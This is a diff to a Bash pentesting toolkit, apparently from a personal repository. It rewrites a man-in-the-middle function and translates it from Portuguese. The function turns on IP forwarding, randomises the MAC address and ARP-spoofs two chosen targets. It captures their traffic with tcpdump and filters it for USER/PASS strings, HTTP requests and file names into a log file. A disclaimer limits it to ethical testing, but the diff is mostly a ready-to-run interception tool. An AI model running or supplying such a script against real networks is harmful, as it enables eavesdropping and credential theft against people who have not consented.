@@ -1399,61 +1399,99 @@
 #! TODO: UPDATE ALL BELOW HERE. The main objective is translate to english and if necessary, refactor the code.
     
     # Define a função x_mitm para realizar um ataque de Man-in-the-Middle (MiTM)
-    function ix_mitm(){
-        ########### VARIAVEIS ##############
-        # Obtém o nome da interface de rede que começa com 'tap'.
-        INTERFACE=$(ip -br a | grep tap | head -n 1 | cut -d ' ' -f1)
-        # Calcula a rede da interface obtida anteriormente.
-        REDE=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}'|awk -F '/' '{print $1}')"|grep -F "Network:"|awk '{print $2}')
-        
-        ########### FUNÇÕES ##############
-        # Limpa a tela e exibe informações sobre a interface e a rede de ataque.
-        function mensagem_inicial (){
+    function x_mitm() {
+        # x_mitm - Perform a Man-in-the-Middle (MiTM) attack
+            #
+            # Description:
+            # This script automates the setup and execution of a MiTM attack.
+            # It performs the following operations:
+            # 1. Identifies the network interface and attack network.
+            # 2. Enables packet forwarding for the host system.
+            # 3. Sets up spoofing, packet capture, and analysis tools.
+            # 4. Captures and filters traffic between two specified targets.
+            #
+            # Dependencies:
+            # - ipcalc: For calculating network ranges.
+            # - macchanger: To randomize the MAC address.
+            # - tilix: For launching new terminal sessions.
+            # - arpspoof: For ARP spoofing.
+            # - tcpdump: For capturing and filtering packets.
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-25
+            # Last Updated: 2025-01-25
+            # Version: 1.1
+            #
+            # Notes:
+            # - Ensure all dependencies are installed.
+            # - This script is intended for ethical testing only.
+            # - Always have explicit permission before performing MiTM operations.
+
+        ########### VARIABLES ##############
+
+        # Function to identify the network interface and attack network
+        function identify_attack_environment() {
+            INTERFACE=$(ip -br a | grep tap | head -n 1 | awk '{print $1}')
+            NETWORK=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}' | awk -F '/' '{print $1}')" | grep -F "Network:" | awk '{print $2}')
+        }
+
+        # Display the initial attack information
+        function display_attack_info() {
             clear
             echo "============= 0.0wL ============="
-            echo "INTERFACE DO ATAQUE: $INTERFACE"
-            echo "REDE DO ATAQUE: $REDE"
+            echo "ATTACK INTERFACE: $INTERFACE"
+            echo "ATTACK NETWORK: $NETWORK"
             echo "================================="
         }
-        
-        # Habilita o roteamento de pacotes no sistema.
-        function habilitar_roteamento_pc (){
+
+        ########### FUNCTIONS ##############
+
+        # Enable packet forwarding on the host system
+        function enable_packet_forwarding() {
             echo 1 > /proc/sys/net/ipv4/ip_forward
             echo "================================="
-            echo "ROTEAMENTO DE PACOTES HABILITADO"
+            echo "PACKET ROUTING ENABLED"
             echo "================================="
         }
-        
-        # Configura o ambiente para spoofing e captura de pacotes.
-        function estrutura_mitm (){
-            macchanger -r "$INTERFACE";  # Altera o endereço MAC da interface para fins de spoofing
-            #wireshark -i "$INTERFACE" -k >/dev/null 2>&1 & # Inicia o Wireshark para captura de pacotes em segundo plano #TODO:REATIVAR WIRESHARK 
-            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix # #! I need to give the correct path to vpn file FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
-            sleep 10  # Espera por 10 segundos
-            echo -n "Digite o IP do ALV01: "  # Solicita o IP do alvo 1
-            read -r ALV01  # Lê o IP do alvo 1
-            echo -n "Digite o IP do ALV02: "  # Solicita o IP do alvo 2
-            read -r ALV02  # Lê o IP do alvo 2
-            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #! I need to give the correct path to vpn file FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
-            #clear  # Limpa a tela
-            #open a new konsole session with arpspoof
-            tcpdump -i "$INTERFACE" -t host "$ALV01" and host "$ALV02" | grep -E '\[P.\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt #todo: add mais ext aos filtros com regex '  # Inicia o Tcpdump para captura de pacotes entre os alvos
-        }
-        
-        # Função principal para execução do ataque MiTM
-        function main_mitm (){
-            mensagem_inicial;  # Chama a função mensagem_inicial.'
-            habilitar_roteamento_pc;  # Chama a função habilitar_roteamento_pc.'
-            estrutura_mitm;  # Chama a função estrutura_mitm.'
-            echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-            read -r 2> /dev/null
-            main_menu
-        }
-        
-        ########### MAIN ##############
-        main_mitm;
 
+        # Set up spoofing and packet capture environment
+        function setup_mitm_environment() {
+            macchanger -r "$INTERFACE"  # Randomize the MAC address for anonymity
+
+            # Start netdiscover in a new Tilix window to scan the network
+            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $NETWORK" &
+            sleep 10  # Allow time for network discovery
+
+            # Prompt user for target IP addresses
+            echo -n "Enter the IP of TARGET 01: "
+            read -r TARGET_01
+            echo -n "Enter the IP of TARGET 02: "
+            read -r TARGET_02
+
+            # Launch ARP spoofing against the two targets in a new Tilix session
+            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $TARGET_01 -r $TARGET_02" &
+
+            # Start packet capture and filter sensitive data
+            tcpdump -i "$INTERFACE" -t host "$TARGET_01" and host "$TARGET_02" \
+                | grep -E '\[P.\]' \
+                | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' \
+                | tee capturas.txt
+        }
+
+        ########### MAIN WORKFLOW ##########
+
+        function main_mitm() {
+            identify_attack_environment  # Identify the attack interface and network
+            display_attack_info          # Display information about the attack setup
+            enable_packet_forwarding     # Enable packet forwarding
+            setup_mitm_environment       # Configure the MiTM environment and capture traffic
+            exit_to_main_menu            # Return to the main menu
+        }
+
+        ########### EXECUTION ##########
+        main_mitm  # Start the main workflow
     }
+
     # Portscan usando bashsocket
     function xi_portscan_bashsocket(){
         # Script retirado do livro Cybersecurity Ops with bash e modificado para as minhas necessidades
